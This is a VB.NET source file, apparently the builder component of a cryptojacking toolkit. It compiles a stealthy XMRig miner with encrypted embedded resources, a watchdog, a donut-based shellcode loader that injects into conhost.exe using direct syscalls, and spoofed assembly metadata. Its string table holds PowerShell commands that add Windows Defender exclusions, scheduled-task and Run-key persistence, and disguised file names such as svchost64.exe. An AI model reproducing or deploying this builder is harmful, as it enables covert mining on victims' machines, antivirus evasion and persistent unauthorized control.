Imports System.CodeDom.Compiler
Imports System.IO
Imports System.IO.Compression
Imports System.Security.Cryptography
Imports System.Text
Imports System.Text.RegularExpressions
Imports Microsoft.CSharp

Public Class Codedom
    Public Shared MinerOK As Boolean = False
    Public Shared WatchdogOK As Boolean = False
    Public Shared LoaderOK As Boolean = False
    Public Shared UninstallerOK As Boolean = False
    Public Shared F As Form1

    Public Shared Sub MinerCompiler(ByVal Path As String, ByVal Code As String, ByVal Res As String, Optional ICOPath As String = "", Optional RequireAdministrator As Boolean = False)
        MinerOK = False

        Dim providerOptions = New Dictionary(Of String, String)
        providerOptions.Add("CompilerVersion", "v4.0")
        Dim CodeProvider As New CSharpCodeProvider(providerOptions)
        Dim Parameters As New CompilerParameters
        Dim OP As String = " /target:winexe /platform:x64 /optimize "

        If Not F.FA.toggleShellcode.Checked Then
            If RequireAdministrator Then
                File.WriteAllBytes(Path & ".manifest", My.Resources.administrator)
                F.txtLog.Text = F.txtLog.Text + ("Adding manifest..." + vbNewLine)
                OP += " /win32manifest:""" + Path & ".manifest" + """"
            End If

            If Not String.IsNullOrEmpty(ICOPath) Then
                F.txtLog.Text = F.txtLog.Text + ("Adding Icon..." + vbNewLine)
                OP += " /win32icon:""" + ICOPath + """"
            End If
        End If


        With Parameters
            .GenerateExecutable = True
            .OutputAssembly = Path
            .CompilerOptions = OP
            .IncludeDebugInformation = False
            If F.FA.toggleEnableDebug.Checked Then
                .ReferencedAssemblies.Add("System.Windows.Forms.dll")
            End If
            .ReferencedAssemblies.Add("System.dll")
            .ReferencedAssemblies.Add("System.Management.dll")
            .ReferencedAssemblies.Add("System.IO.Compression.dll")
            .ReferencedAssemblies.Add("System.IO.Compression.FileSystem.dll")

            F.txtLog.Text = F.txtLog.Text + ("Creating resources..." + vbNewLine)

            Using R As New Resources.ResourceWriter(IO.Path.GetTempPath & "\" + Res + ".Resources")
                R.AddResource(F.Resources_xmrig, F.AES_Encryptor(My.Resources.xmrig))
                R.AddResource(F.Resources_winring, F.AES_Encryptor(My.Resources.WinRing0x64))
                If F.chkInstall.Checked And F.toggleWatchdog.Checked Then
                    R.AddResource(F.Resources_watchdog, F.AES_Encryptor(F.watchdogdata))
                End If
                If F.toggleEnableGPU.Checked Then
                    R.AddResource(F.Resources_libs, F.AES_Encryptor(My.Resources.libs))
                End If
                R.Generate()
            End Using

            F.txtLog.Text = F.txtLog.Text + ("Embedding resources..." + vbNewLine)
            .EmbeddedResources.Add(IO.Path.GetTempPath & "\" + Res + ".Resources")

            Dim minerbuilder As New StringBuilder(Code)

            ReplaceGlobals(minerbuilder)

            Dim Results = CodeProvider.CompileAssemblyFromSource(Parameters, minerbuilder.ToString())
            If Results.Errors.Count > 0 Then
                For Each E In Results.Errors
                    MsgBox("Line: " & E.Line & " Column: " & E.Column & " Error message: " & E.ErrorText, MsgBoxStyle.Critical)
                Next
            Else
                MinerOK = True
            End If
        End With
        Try : IO.File.Delete(Path & ".manifest") : Catch : End Try
        Try : IO.File.Delete(Environment.GetFolderPath(35) + "\icon.ico") : Catch : End Try
    End Sub

    Public Shared Sub WatchdogCompiler(ByVal Path As String, ByVal Code As String, Optional RequireAdministrator As Boolean = False)
        WatchdogOK = False

        Dim providerOptions = New Dictionary(Of String, String)
        providerOptions.Add("CompilerVersion", "v4.0")
        Dim CodeProvider As New CSharpCodeProvider(providerOptions)
        Dim Parameters As New CompilerParameters
        Dim OP As String = " /target:winexe /platform:x64 /optimize "

        If RequireAdministrator Then
            File.WriteAllBytes(Path & ".manifest", My.Resources.administrator)
            F.txtLog.Text = F.txtLog.Text + ("Adding manifest..." + vbNewLine)
            OP += " /win32manifest:""" + Path & ".manifest" + """"
        End If

        With Parameters
            .GenerateExecutable = True
            .OutputAssembly = Path
            .CompilerOptions = OP
            .IncludeDebugInformation = False
            If F.FA.toggleEnableDebug.Checked Then
                .ReferencedAssemblies.Add("System.Windows.Forms.dll")
            End If
            .ReferencedAssemblies.Add("System.dll")
            .ReferencedAssemblies.Add("System.Management.dll")

            Dim watchdogbuilder As New StringBuilder(Code)

            ReplaceGlobals(watchdogbuilder)

            Dim Results = CodeProvider.CompileAssemblyFromSource(Parameters, watchdogbuilder.ToString())
            If Results.Errors.Count > 0 Then
                For Each E In Results.Errors
                    MsgBox("Line: " & E.Line & " Column: " & E.Column & " Error message: " & E.ErrorText, MsgBoxStyle.Critical)
                Next
            Else
                WatchdogOK = True
            End If

            If RequireAdministrator Then
                File.Delete(Path & ".manifest")
            End If
        End With

    End Sub

    Public Shared Sub LoaderCompiler(ByVal SavePath As String, ByVal InputFile As String, ByVal Args As String, Optional ICOPath As String = "", Optional AssemblyData As Boolean = False, Optional RequireAdministrator As Boolean = False, Optional IsMiner As Boolean = False)
        Try
            LoaderOK = False
            F.Key = F.RandomString(32)
            Dim currentDirectory = Path.GetDirectoryName(SavePath)
            Dim filename = Path.GetFileNameWithoutExtension(SavePath)
            Dim paths As Dictionary(Of String, String) = New Dictionary(Of String, String)() From {
                    {"current", currentDirectory},
                    {"includes", Path.Combine(currentDirectory, "Includes")},
                    {"compilers", Path.Combine(currentDirectory, "Compilers")},
                    {"compilerslog", Path.Combine(currentDirectory, "Compilers\logs")},
                    {"windres", Path.Combine(currentDirectory, "Compilers\MinGW64\bin\windres.exe")},
                    {"tcc", Path.Combine(currentDirectory, "Compilers\tinycc\tcc.exe")},
                    {"donut", Path.Combine(currentDirectory, "Compilers\donut\donut.exe")},
                    {"windreslog", Path.Combine(currentDirectory, "Compilers\logs\windres.log")},
                    {"tcclog", Path.Combine(currentDirectory, "Compilers\logs\tcc.log")},
                    {"donutlog", Path.Combine(currentDirectory, "Compilers\logs\donut.log")},
                    {"manifest", Path.Combine(currentDirectory, "administrator.manifest")},
                    {"resource.rc", Path.Combine(currentDirectory, "resource.rc")},
                    {"resource.o", Path.Combine(currentDirectory, "resource.o")},
                    {"loader", Path.Combine(currentDirectory, "loader.bin")},
                    {"filename", Path.Combine(currentDirectory, filename)}
                }
            Dim directoryFilter = F.CheckNonASCII(SavePath)
            If F.BuildErrorTest(directoryFilter.Length > 0, String.Format("Error: Build path ""{0}"" contains the following illegal special characters: {1}, please choose a build path without any special characters.", SavePath, String.Join("", directoryFilter))) Then Return
            If F.BuildErrorTest(Not F.txtStartDelay.Text.All(New Func(Of Char, Boolean)(AddressOf Char.IsDigit)), "Error: Start Delay must be a number.") Then Return

            If Not Directory.Exists(paths("compilers")) Then
                Using archive As ZipArchive = New ZipArchive(New MemoryStream(My.Resources.Compilers))
                    archive.ExtractToDirectory(paths("compilers"))
                End Using
            End If

            If Not Directory.Exists(paths("includes")) Then
                Using archive As ZipArchive = New ZipArchive(New MemoryStream(My.Resources.Includes))
                    archive.ExtractToDirectory(paths("includes"))
                End Using
            End If

            Dim sb As StringBuilder = New StringBuilder(My.Resources.Program1)
            Dim buildResource As Boolean = Not String.IsNullOrEmpty(ICOPath) OrElse RequireAdministrator OrElse AssemblyData

            If buildResource Then
                If F.BuildErrorTest(Not String.Join("", New String() {F.num_Assembly1.Text, F.num_Assembly2.Text, F.num_Assembly3.Text, F.num_Assembly4.Text}).All(New Func(Of Char, Boolean)(AddressOf Char.IsDigit)), "Error: Assembly Version must only contain numbers.") Then Return
                Dim resource As StringBuilder = New StringBuilder(My.Resources.resource)
                Dim defs = ""

                If Not String.IsNullOrEmpty(ICOPath) Then
                    resource.Replace("#ICON", F.ToLiteral(ICOPath))
                    defs += " -DDefIcon"
                End If

                If RequireAdministrator Then
                    File.WriteAllBytes(paths("manifest"), My.Resources.administrator)
                    defs += " -DDefAdmin"
                    sb.Replace("DefWD", "TRUE")
                End If

                If AssemblyData Then
                    resource.Replace("#TITLE", F.ToLiteral(F.txtTitle.Text))
                    resource.Replace("#DESCRIPTION", F.ToLiteral(F.txtDescription.Text))
                    resource.Replace("#COMPANY", F.ToLiteral(F.txtCompany.Text))
                    resource.Replace("#PRODUCT", F.ToLiteral(F.txtProduct.Text))
                    resource.Replace("#COPYRIGHT", F.ToLiteral(F.txtCopyright.Text))
                    resource.Replace("#TRADEMARK", F.ToLiteral(F.txtTrademark.Text))
                    resource.Replace("#VERSION", String.Join(",", New String() {F.num_Assembly1.Text, F.num_Assembly2.Text, F.num_Assembly3.Text, F.num_Assembly4.Text}))
                    defs += " -DDefAssembly"
                End If

                File.WriteAllText(paths("resource.rc"), resource.ToString())
                F.RunExternalProgram("cmd", String.Format("cmd /c ""{0}"" --input resource.rc --output resource.o -O coff {1}", paths("windres"), defs), currentDirectory, paths("windreslog"))
                File.Delete(paths("resource.rc"))
                File.Delete(paths("manifest"))
                If F.BuildErrorTest(Not File.Exists(paths("resource.o")), String.Format("Error: Failed at compiling resources, check the error log at {0}.", paths("windreslog"))) Then Return
            End If

            F.RunExternalProgram(paths("donut"), String.Format("""{0}"" -a 2 -f 1", InputFile), currentDirectory, paths("donutlog"))
            Dim shellcodebytes As String = File.ReadAllText(paths("loader"), Encoding.GetEncoding("ISO-8859-1"))
            Dim shellcode As String = F.ToLiteral(F.Cipher(shellcodebytes, F.Key))

            sb.Replace("#KEYLENGTH", F.Key.Length)
            sb.Replace("#KEY", F.Key)
            sb.Replace("#DELAY", F.txtStartDelay.Text)
            sb.Replace("#SHELLCODELENGTH", shellcodebytes.Length)
            sb.Replace("#SHELLCODE", shellcode)
            sb.Replace("#ARGS", Args)
            F.CipherReplace(sb, "#ENV", "SystemRoot")
            F.CipherReplace(sb, "#TARGET", "System32\conhost.exe")
            F.CipherReplace(sb, "#FORMAT1", "%s\%s")
            F.CipherReplace(sb, "#FORMAT2", """%s"" ""%s""")

            File.WriteAllText(paths("filename") & ".c", sb.ToString(), Encoding.GetEncoding("ISO-8859-1"))
            F.RunExternalProgram(paths("tcc"), String.Format("-Wl,-subsystem=windows ""{0}"" {1} ""{2}"" -xa ""{3}"" ", filename & ".c", If(buildResource, "resource.o", ""), Path.Combine(currentDirectory, "Includes\syscalls.c"), Path.Combine(currentDirectory, "Includes\syscallsstubs.asm")), currentDirectory, paths("tcclog"))
            File.Delete(paths("resource.o"))
            File.Delete(paths("filename") & ".c")
            File.Delete(paths("loader"))
            If F.BuildErrorTest(Not File.Exists(paths("filename") & ".exe"), String.Format("Error: Failed at compiling program, check the error log at {0}.", paths("tcclog"))) Then Return
            LoaderOK = True
        Catch ex As Exception
            MessageBox.Show("Error: An error occured while building the file: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
    End Sub

    Public Shared Sub UninstallerCompiler(ByVal SavePath As String)
        UninstallerOK = False

        Dim providerOptions = New Dictionary(Of String, String)
        providerOptions.Add("CompilerVersion", "v4.0")
        Dim CodeProvider As New CSharpCodeProvider(providerOptions)
        Dim Parameters As New CompilerParameters
        Dim OP As String = " /target:winexe /platform:x64 /optimize "

        If F.FA.toggleAdministrator.Checked Then
            File.WriteAllBytes(SavePath & ".manifest", My.Resources.administrator)
            F.txtLog.Text = F.txtLog.Text + ("Adding manifest..." + vbNewLine)
            OP += " /win32manifest:""" + SavePath & ".manifest" + """"
        End If

        With Parameters
            .GenerateExecutable = True
            .OutputAssembly = SavePath
            .CompilerOptions = OP
            .IncludeDebugInformation = False
            .ReferencedAssemblies.Add("System.dll")
            .ReferencedAssemblies.Add("System.Management.dll")
            If F.FA.toggleEnableDebug.Checked Then
                .ReferencedAssemblies.Add("System.Windows.Forms.dll")
            End If

            F.txtLog.Text = F.txtLog.Text + ("Creating Uninstaller..." + vbNewLine)

            Dim uninstallerbuilder As New StringBuilder(My.Resources.Uninstaller)

            ReplaceGlobals(uninstallerbuilder)

            Dim Results = CodeProvider.CompileAssemblyFromSource(Parameters, uninstallerbuilder.ToString())
            If Results.Errors.Count > 0 Then
                For Each E In Results.Errors
                    MsgBox("Line: " & E.Line & " Column: " & E.Column & " Error message: " & E.ErrorText, MsgBoxStyle.Critical)
                Next
            Else
                UninstallerOK = True
            End If

            If F.FA.toggleAdministrator.Checked Then
                File.Delete(SavePath & ".manifest")
            End If
        End With
    End Sub

    Public Shared Sub ReplaceGlobals(ByRef stringb As StringBuilder)
        If F.FA.toggleKillWD.Checked Then
            stringb.Replace("DefKillWD", "true")
            stringb.Replace("#KillWDCommands", F.EncryptString("cmd /c powershell -Command ""Add-MpPreference -ExclusionPath @(($pwd).path, $env:UserProfile,$env:AppData,$env:Temp,$env:SystemRoot,$env:HomeDrive,$env:SystemDrive) -Force"" & powershell -Command ""Add-MpPreference -ExclusionExtension @('exe','dll') -Force"" & exit"))
        End If

        If F.FA.toggleEnableDebug.Checked Then
            stringb.Replace("DefDebug", "true")
        End If

        If F.toggleEnableGPU.Checked Then
            stringb.Replace("DefGPU", "true")
        End If

        If F.FA.toggleShellcode.Checked Then
            stringb.Replace("DefShellcode", "true")
        End If

        If F.chkInstall.Checked Then
            stringb.Replace("DefInstall", "true")

            Dim installdir As String

            Select Case F.txtInstallPathMain.Text
                Case "AppData"
                    installdir = "Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)"
                Case "UserProfile"
                    installdir = "Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)"
                Case "Temp"
                    installdir = "Path.GetTempPath()"
                Case Else
                    installdir = "Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)"
            End Select

            If F.FA.toggleInstallSystem32.Checked Then
                stringb.Replace("DefSystem32", "true")
                stringb.Replace("PayloadPath", "System.IO.Path.Combine((new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) ? Environment.SystemDirectory : " & installdir & "), _rGetString_(" & Chr(34) & F.EncryptString(F.txtInstallFileName.Text) & Chr(34) & "))")
            Else
                stringb.Replace("PayloadPath", "System.IO.Path.Combine(" & installdir & ", _rGetString_(" & Chr(34) & F.EncryptString(F.txtInstallFileName.Text) & Chr(34) & "))")
            End If

            If F.toggleWatchdog.Checked Then
                stringb.Replace("DefWatchdog", "true")
            End If
        End If

        If F.chkAssembly.Checked Then
            stringb.Replace("DefAssembly", "true")
            stringb.Replace("%Title%", F.txtTitle.Text)
            stringb.Replace("%Description%", F.txtDescription.Text)
            stringb.Replace("%Company%", F.txtCompany.Text)
            stringb.Replace("%Product%", F.txtProduct.Text)
            stringb.Replace("%Copyright%", F.txtCopyright.Text)
            stringb.Replace("%Trademark%", F.txtTrademark.Text)
            stringb.Replace("%v1%", F.num_Assembly1.Text)
            stringb.Replace("%v2%", F.num_Assembly2.Text)
            stringb.Replace("%v3%", F.num_Assembly3.Text)
            stringb.Replace("%v4%", F.num_Assembly4.Text)
        End If

        stringb.Replace("#KEY", F.AESKEY)
        stringb.Replace("#SALT", F.SALT)
        stringb.Replace("#IV", F.IV)
        stringb.Replace("#LIBSPATH", F.EncryptString("Microsoft\Libs\"))
        stringb.Replace("#WATCHDOG", F.EncryptString("sihost64"))
        stringb.Replace("#TASKSCH", F.EncryptString("/c schtasks /create /f /sc onlogon /rl highest /tn """ + Path.GetFileNameWithoutExtension(F.txtInstallFileName.Text) + """ /tr ""{0}"""))
        stringb.Replace("#REGADD", F.EncryptString("cmd /c reg add ""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /v """ + Path.GetFileNameWithoutExtension(F.txtInstallFileName.Text) + """ /t REG_SZ /F /D ""{0}"""))
        stringb.Replace("#MINERQUERY", F.EncryptString("Select CommandLine from Win32_Process where Name='{0}'"))
        stringb.Replace("#GPUQUERY", F.EncryptString("SELECT Name, VideoProcessor FROM Win32_VideoController"))
        stringb.Replace("#MINERID", F.EncryptString("--cinit-find-x"))
        stringb.Replace("#DROPFILE", F.EncryptString("svchost64.exe"))
        stringb.Replace("#InjectionTarget", F.EncryptString(F.InjectionTarget(0)))
        stringb.Replace("#InjectionDir", F.InjectionTarget(1).Replace("(", "").Replace(")", "").Replace("%WINDIR%", """ + Environment.GetFolderPath(Environment.SpecialFolder.Windows) + """))
        stringb.Replace("#SCMD", F.EncryptString("cmd"))
        stringb.Replace("#CMDSTART", F.EncryptString("cmd /c ""{0}"""))
        stringb.Replace("#CMDKILL", F.EncryptString("cmd /c taskkill /f /PID ""{0}"""))

        stringb.Replace("startDelay", F.txtStartDelay.Text)

        For Each m As Match In Regex.Matches(stringb.ToString(), "_r(.+?)_")
            For Each c As Capture In m.Captures
                stringb.Replace(c.Value, F.Randomi(F.rand.Next(5, 40)))
            Next
        Next
    End Sub
End Class
